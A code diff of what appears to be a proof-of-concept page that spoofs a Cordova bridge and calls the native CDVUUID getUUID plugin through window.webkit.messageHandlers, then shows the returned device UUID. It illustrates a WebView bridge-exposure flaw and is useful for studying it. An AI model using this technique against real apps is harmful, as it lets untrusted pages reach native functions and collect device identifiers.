@@ -67,7 +67,11 @@
 
     window.myproperty = {}
     myproperty.nativeCallback =  function(callbackID, p2, res, p4, p5){
-        console.log("[attacker]: " + JSON.stringify(res) );
+        switch(callbackID){
+            case "cb_getUUID":
+                document.getElementById("UUID").innerText = "Your UUID: \n" + res;
+                break;
+        }
     }
 
     window.cordova = {};
@@ -75,7 +79,13 @@
         if(param == "cordova/exec"){
             return myproperty;
         }
-    } 
+    }
+
+    window.webkit.messageHandlers.cordova.postMessage([
+        "cb_getUUID", "CDVUUID", "getUUID",[]
+    ]);
+
+
 
 
     </script>
